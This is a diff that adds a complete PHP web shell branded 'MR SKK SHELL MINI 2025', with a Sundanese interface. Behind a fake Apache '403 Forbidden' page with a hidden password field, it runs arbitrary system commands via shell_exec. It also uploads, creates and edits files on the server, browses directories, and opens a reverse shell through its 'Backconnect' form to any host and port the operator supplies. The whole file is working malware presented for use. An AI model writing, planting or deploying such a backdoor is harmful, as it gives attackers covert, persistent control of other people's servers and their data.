@@ -1,0 +1,224 @@
+<?php
+$password = "minishell2025skk"; // passwod
+session_start();
+error_reporting(0);
+set_time_limit(0);
+ini_set("memory_limit",-1);
+$sessioncode = md5(__FILE__);
+if(!empty($password) and $_SESSION[$sessioncode] != $password){
+    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
+        $_SESSION[$sessioncode] = $password;
+    }
+    else {
+        print "
+<html><head>
+<title>403 Forbidden</title>
+</head>
+<body><h1>Forbidden</h1>
+<p>You don't have permission to access this page on this server.</p>
+<hr>
+<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
+<style>
+input { margin:0;background-color:#fff;border:1px solid #fff; }
+</style>
+<center>
+</body>
+<pre align=center><font>
+</font><form method=post> <input type='password' name='pass'></form></pre>";
+        exit;        
+    }
+}
+?>
+<?php
+$pass = "sandi-rahasia";
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+$edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
+
+if (isset($_GET['key']) && $_GET['key'] === $pass) {
+    if (isset($_GET['cmd'])) {
+        echo "<pre class='cmd-output'>" . shell_exec($_GET['cmd']) . "</pre>";
+    }
+
+    if (isset($_FILES['upload_file'])) {
+        $file_tmp = $_FILES['upload_file']['tmp_name'];
+        $file_name = $_FILES['upload_file']['name'];
+        move_uploaded_file($file_tmp, $current_dir . '/' . $file_name);
+    }
+
+    // Nambahkeun fitur pikeun nyieun dir anyar
+    if (isset($_POST['create_dir'])) {
+        $new_dir = $_POST['dir_name'];
+        mkdir($current_dir . '/' . $new_dir);
+    }
+
+    // Nambahkeun fitur pikeun nyieun file anyar
+    if (isset($_POST['create_file'])) {
+        $new_file = $_POST['file_name'];
+        file_put_contents($current_dir . '/' . $new_file, "");
+    }
+
+    // Nambahkeun fitur pikeun nyimpen parobahan file
+    if (isset($_POST['save_file'])) {
+        $file_content = $_POST['file_content'];
+        file_put_contents($current_dir . '/' . $edit_file, $file_content);
+    }
+
+    // Fitur Backconnect
+    if (isset($_POST['backconnect'])) {
+        $host = $_POST['host'];
+        $port = $_POST['port'];
+        $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if ($sock) {
+            socket_connect($sock, $host, $port);
+            while ($cmd = socket_read($sock, 2048)) {
+                $output = shell_exec($cmd);
+                socket_write($sock, $output, strlen($output));
+            }
+            socket_close($sock);
+        } else {
+            echo "Gagal nyiptakeun sambungan!";
+        }
+    }
+}
+
+function getFilePermissions($file) {
+    return substr(sprintf('%o', fileperms($file)), -4);
+}
+
+function getParentDirectory($dir) {
+    return dirname($dir);
+}
+
+function getFileContent($file) {
+    return file_get_contents($file);
+}
+?>
+
+<!DOCTYPE html>
+<html lang="su">
+<head>
+    <meta charset="UTF-8">
+    <title>MR SKK SHELL MINI 2025</title>
+    <style>
+        body { font-family: monospace; background-color: #1E1E1E; color: #FFFFFF; padding: 20px; text-align: center; }
+        h1 { color: #FF4500; }
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+        }
+        .form-container {
+            background-color: #2C2C2C;
+            padding: 15px;
+            border-radius: 5px;
+            flex: 1 1 calc(30% - 15px);
+        }
+        input[type="text"], input[type="file"], input[type="submit"], textarea {
+            width: calc(100% - 22px); 
+            padding: 10px; 
+            margin: 10px 0; 
+            border: 1px solid #4CAF50; 
+            border-radius: 5px; 
+            background-color: #4CAF50; 
+            color: #FFFFFF; 
+        }
+        pre { background-color: #2C2C2C; padding: 10px; border-radius: 5px; color: #FFFF00; }
+        .file { color: #00FF00; }
+        .dir { color: #00CED1; }
+        .current-dir { color: #FFD700; }
+        .logo { margin: 20px 0; }
+        ul { list-style-type: none; padding: 0; }
+        li { margin: 5px 0; color: #FF69B4; }
+    </style>
+</head>
+<body>
+    <h1>MR SKK SHELL MINI 2025</h1>
+    <div class="logo">
+        <img src="https://res.cloudinary.com/di1pwoapk/image/upload/v1737373092/skk1x1clear_oswurm.png" alt="Logo" style="max-width: 150px;">
+    </div>
+    <p>Dir ayeuna: <a class="current-dir" href="?key=<?php echo $pass; ?>&dir=<?php echo urlencode($current_dir); ?>"><?php echo htmlspecialchars($current_dir); ?></a></p>
+
+    <?php if (dirname($current_dir) !== '/') : ?>
+        <a href="?key=<?php echo $pass; ?>&dir=<?php echo urlencode(getParentDirectory($current_dir)); ?>">Mundur ka Dir Tukang</a>
+    <?php endif; ?>
+    
+    <div class="container">
+        <div class="form-container">
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="upload_file" />
+                <input type="submit" value="Unggah File" />
+            </form>
+        </div>
+
+        <div class="form-container">
+            <form method="post">
+                <input type="text" name="dir_name" placeholder="Nami Dir Anyar" required />
+                <input type="submit" name="create_dir" value="Nyieun Dir Anyar" />
+            </form>
+        </div>
+
+        <div class="form-container">
+            <form method="post">
+                <input type="text" name="file_name" placeholder="Nami File Anyar" required />
+                <input type="submit" name="create_file" value="Nyieun File Anyar" />
+            </form>
+        </div>
+
+        <?php if ($edit_file): ?>
+            <div class="form-container">
+                <h2>Edit File: <?php echo htmlspecialchars($edit_file); ?></h2>
+                <form method="post">
+                    <textarea name="file_content" rows="10"><?php echo htmlspecialchars(getFileContent($current_dir . '/' . $edit_file)); ?></textarea>
+                    <input type="submit" name="save_file" value="Simpen Parobahan" />
+                </form>
+            </div>
+        <?php endif; ?>
+        
+        <div class="form-container">
+            <h2>Fitur Backconnect</h2>
+            <form method="post">
+                <input type="text" name="host" placeholder="Host" required />
+                <input type="text" name="port" placeholder="Port" required />
+                <input type="submit" name="backconnect" value="Sambungkeun" />
+            </form>
+        </div>
+    </div>
+
+    <form method="get">
+        <input type="text" name="cmd" placeholder="Paréntah (cont: ls)" />
+        <input type="submit" value="Jalankeun" />
+    </form>
+
+    <h2>Hasil Paréntah:</h2>
+    <pre>
+    <?php
+    if (isset($_GET['cmd'])) {
+        echo shell_exec($_GET['cmd']);
+    }
+    ?>
+    </pre>
+
+    <h2>Daftar File:</h2>
+    <ul>
+        <?php
+        $files = scandir($current_dir);
+        foreach ($files as $file) {
+            if ($file !== '.' && $file !== '..') {
+                $filePath = $current_dir . '/' . $file;
+                $permissions = getFilePermissions($filePath);
+                if (is_dir($filePath)) {
+                    echo "<li class='dir'><a href='?key={$pass}&dir=" . urlencode($filePath) . "'>$file</a> (Perm: $permissions)</li>";
+                } else {
+                    echo "<li class='file'><a href='?key={$pass}&dir=" . urlencode($current_dir) . "&edit=" . urlencode($file) . "'>$file</a> (Perm: $permissions)</li>";
+                }
+            }
+        }
+        ?>
+    </ul>
+
+    <div style="margin-top: 20px;">
+        <a href="?key=<?php echo $pass; ?>&dir=<?php echo urlencode(getcwd()); ?>" style="padding: 10px; background-color: #4CAF50; color: #FFFFFF; text-decoration: none; border-radius: 5px;">Home</a>
+    </div>
+</body>
+</html>
